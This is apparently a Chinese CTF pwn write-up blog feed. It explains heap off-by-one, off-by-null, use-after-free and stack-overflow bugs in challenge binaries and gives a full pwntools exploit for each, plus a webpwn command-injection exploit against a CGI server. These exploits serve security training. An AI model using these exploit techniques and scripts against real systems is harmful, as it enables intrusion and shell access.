        <content type="html"><![CDATA[<h3 id="长安战疫pwn-wp"><a href="#长安战疫pwn-wp" class="headerlink" title="长安战疫pwn wp"></a>长安战疫pwn wp</h3><span id="more"></span><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。</p><p><a href="https://imgtu.com/i/7Fg7qg"><img src="https://s4.ax1x.com/2022/01/09/7Fg7qg.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2022/01/09/7Fg7qg.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="7Fg7qg.png"></a></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;pwn1&#x27;)</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">stack = int(io.recv(10),16)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(&#x27;a&#x27;*0x30+p32(0x8048540)+p32(stack+0x34))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>libc-2.27的off-by-one，细心一点就能发现for循环这块会让我们多输入一个字节。</p><p><a href="https://imgtu.com/i/7FgLIs"><img src="https://s4.ax1x.com/2022/01/09/7FgLIs.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2022/01/09/7FgLIs.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="7FgLIs.png"></a></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;Choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#0</span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#2</span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#3</span><br><span class="line">add(0x18,&#x27;f1ag\n&#x27;)#4</span><br><span class="line">dele(2)</span><br><span class="line">add(0xf8,&#x27;a&#x27;*0xf0+p64(0x300)+&#x27;\n&#x27;)#2</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">add(0xf8,&#x27;a\n&#x27;)#5~11</span><br><span class="line">for i in range(7):</span><br><span class="line">dele(11-i)</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(7):</span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#0,3,5~9</span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#10</span><br><span class="line">show(1)</span><br><span class="line">malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"></span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#11=1</span><br><span class="line">dele(1)</span><br><span class="line">edit(11,p64(free_hook-8)+&#x27;\n&#x27;)</span><br><span class="line">add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line">add(0xf8,&#x27;/bin/sh\x00&#x27;+p64(system)+&#x27;\n&#x27;)#12</span><br><span class="line">dele(12)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。</p><p><a href="https://imgtu.com/i/7Fgqaj"><img src="https://s4.ax1x.com/2022/01/09/7Fgqaj.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2022/01/09/7Fgqaj.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="7Fgqaj.png"></a></p><p>因为有exit函数，很容易联想到打exit_hook。[exit_hook的知识点]( <a href="https://blackbird-bb.github.io/2021/05/20/PWN%E5%AD%A6%E4%B9%A0%E2%80%94exit-hook-%E5%81%B7%E5%AE%B6/">PWN学习—exit_hook-偷家 - BlackBird’s Blog (blackbird-bb.github.io)</a> ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./Gpwn3&#x27;)</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10002)</span><br><span class="line">elf=ELF(&#x27;./Gpwn3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create(description):</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendafter(&#x27; level :\n&#x27;,description)</span><br><span class="line"></span><br><span class="line">def power(description):</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendafter(&#x27;another level :&#x27;,description)</span><br><span class="line"></span><br><span class="line">def beat():</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def give_up():</span><br><span class="line">io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">create(&#x27;a&#x27;*35+&#x27;\n&#x27;)</span><br><span class="line">power(&#x27;a&#x27;)</span><br><span class="line">power(&#x27;\xff\xff\xff\xff&#x27;)</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;reward: &#x27;)</span><br><span class="line">puts=int(io.recv(14),16)</span><br><span class="line">libc_base=puts-libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">dl_rtld_unlock_recursive = libc_base+0x5f0040+3856</span><br><span class="line">gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))</span><br><span class="line"></span><br><span class="line">io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>这个题有个小问题，忘了在add函数后加break跳出switch，因此有师傅修switch时修不出来add，只能看汇编代码，在这里和各位师傅道个歉。</p><p>此题的漏洞在free时没有对指针置0，libc-2.31的uaf。</p><p><a href="https://imgtu.com/i/7FgbZQ"><img src="https://s4.ax1x.com/2022/01/09/7FgbZQ.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2022/01/09/7FgbZQ.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="7FgbZQ.png"></a></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn4&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn4&#x27;)</span><br><span class="line">libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,key,value):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line">io.sendlineafter(&#x27;Please input a key: &#x27;,key)</span><br><span class="line">io.sendlineafter(&#x27;Please input a value: &#x27;,str(value))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,name,length,key,value):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line">io.sendlineafter(&#x27;New key length: &#x27;,str(length))</span><br><span class="line">io.sendlineafter(&#x27;Key: &#x27;,key)</span><br><span class="line">io.sendlineafter(&#x27;Value: &#x27;,str(value))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">add(0,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x417,0)</span><br><span class="line">add(1,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x3c7,1)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line">malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - 96 -16</span><br><span class="line">libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"></span><br><span class="line">add(2,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,2)</span><br><span class="line">add(3,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,3)</span><br><span class="line">dele(3)</span><br><span class="line">dele(2)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">edit(1,&#x27;f1ag&#x27;,8,&#x27;/bin/sh\x00&#x27;,1)</span><br><span class="line">edit(2,&#x27;f1ag&#x27;,6,p32((free_hook-0x51)&amp;0xffffffff)+p16(((free_hook)&gt;&gt;32)&amp;0xffff),2)</span><br><span class="line"></span><br><span class="line">add(4,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x51+p32((system)&amp;0xffffffff)+p16(((system)&gt;&gt;32)&amp;0xffff),&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">#add(6,&#x27;f1ag&#x27;,p64(system),5)</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安洵final</title>
      <link href="/2022/01/07/%E5%AE%89%E6%B4%B5final/"/>
      <url>/2022/01/07/%E5%AE%89%E6%B4%B5final/</url>
      
        <content type="html"><![CDATA[<h3 id="安洵final"><a href="#安洵final" class="headerlink" title="安洵final"></a>安洵final</h3><span id="more"></span><p>安洵杯线下赛的最后一题，webpwn当时没做出来，看了两三天+darry的帮助下才复现出来。</p><p>做这类题目需要认认真真的去分析，才能找到漏洞点，但认真分析就会很浪费时间，说到底还是太菜。</p><p>首先要做的就是如何正确的输入，从下面三张图片即可看出需要我们输入请求方式、文件名、任意</p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108111637961.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108111637961.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108111637961"></p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108112409522.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108112409522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108112409522"></p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108112446637.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108112446637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108112446637"></p><p>下面这段代码自定义了一个头部X-Forword-For ，其后内容长度必须大于七，且必须是192.168.1.1~20</p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108112932471.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108112932471.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108112932471"></p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108113108046.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108113108046.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108113108046"></p><p>输入问题解决后，就得寻找漏洞了，一般的漏洞是目录穿越或者栈溢出。</p><p>从data段中找到了<code>login.cgi</code>、<code>logout.cgi</code>、<code>wifictl.cgi</code>、<code>logctl.cgi</code>，这些是文件名，并且每个文件名对应一个函数。</p><p>下图是以’=‘，’？‘，’&amp;‘三个符号将文件名分解</p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108121954428.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108121954428.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108121954428"></p><p><code>sub_4034FD</code>函数如下，a2是我们的输入，可以输入任意长度，并且复制给<code>dest1[16 * i + 40]</code></p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108123226353.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108123226353.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108123226353"></p><p>下图可以得出’？‘后应该跟ring_token</p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108115456348.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108115456348.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108115456348"></p><p>我们先看看wifictl这个函数，这个函数会给我们显示时间</p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108124437931.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108124437931.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108124437931"></p><p>漏洞点在logctl这个函数里，首先需要有一个token值，值是wifictl给出的时间。</p><p><img src="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108125007789.png" class="lazyload placeholder" data-srcset="/2022/01/07/%E5%AE%89%E6%B4%B5final/ABf1ag-blog\source_posts\安洵final\image-20220108125007789.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108125007789"></p><p>在<code>sub_402E56</code>中，a2是我们的输入，任意长度，s接受输入的值，因此有溢出，我们就可以控制a3了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_402E56(__int64 a1, const char *a2, char *a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int v6; // [rsp+20h] [rbp-CE0h]</span><br><span class="line">  int i; // [rsp+24h] [rbp-CDCh]</span><br><span class="line">  int k; // [rsp+24h] [rbp-CDCh]</span><br><span class="line">  int j; // [rsp+28h] [rbp-CD8h]</span><br><span class="line">  int v10; // [rsp+2Ch] [rbp-CD4h]</span><br><span class="line">  int v11[128]; // [rsp+30h] [rbp-CD0h] BYREF</span><br><span class="line">  char v12[128]; // [rsp+230h] [rbp-AD0h] BYREF</span><br><span class="line">  char s[1312]; // [rsp+2B0h] [rbp-A50h] BYREF</span><br><span class="line">  char v14[1304]; // [rsp+7D0h] [rbp-530h] BYREF</span><br><span class="line">  unsigned __int64 v15; // [rsp+CE8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(s, 0, 0x514uLL);</span><br><span class="line">    memset(v14, 0, sizeof(v14));</span><br><span class="line">    memset(v12, 0, sizeof(v12));</span><br><span class="line">    memset(v11, 0, sizeof(v11));</span><br><span class="line">    strcpy(v12, &quot;$;`&#x27;&amp;|&lt;&gt;^\n\r&quot;);</span><br><span class="line">    strcpy(s, a2);</span><br><span class="line">    for ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      for ( j = 0; j &lt; strlen(v12); ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( s[i] == v12[j] )</span><br><span class="line">        &#123;</span><br><span class="line">          v11[i] = 1;                           // v11[i]表示有和上面相同的符号</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( k = 0; k &lt; strlen(v12); ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v11[k] == 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v10++;</span><br><span class="line">        v14[v3] = v12[k];</span><br><span class="line">        v6 = 1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy(a3, v14);</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5被我们控制后，popen函数会调用execve函数执行参数，因此我们就可以直接写/bin/sh了。</p><p>在使用pwntool模块时，我们需要注意下在写参数时需要进行url编码，所以得将空格换成%20或+。使用request模块则不需要。</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,&#x27;10000&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">payload = &#x27;GET /wifictl.cgi?ring_token=1 HTTP/1/1\r\nX-Forword-For: 192.168.1.1\r\n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&#x27;now time is &#x27;)</span><br><span class="line">time=io.recvuntil(&#x27;.&#x27;)[:-1]</span><br><span class="line">print(time)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,&#x27;10000&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">#cmd = &#x27;a;&#x27;+&#x27;a&#x27;*1311+&quot;/bin/cat /flag &gt; a;&quot;</span><br><span class="line">cmd = &#x27;a;&#x27;+&#x27;a&#x27;*1311+&#x27;/bin/ls+/+&gt;+/var/www/html/a;&#x27;</span><br><span class="line">payload = &#x27;GET /logctl.cgi?ring_token=&#123;0&#125;&amp;aa=&#123;1&#125; HTTP/1/1\r\nX-Forword-For: 192.168.1.1\r\n&#x27;.format(int(time)+1,cmd)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10000)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">payload = &#x27;GET /a HTTP/1/1\r\nX-Forword-For: 192.168.1.1\r\n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.close()</span><br><span class="line">#io.interactive()</span><br></pre></td></tr></table></figure><p>request模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 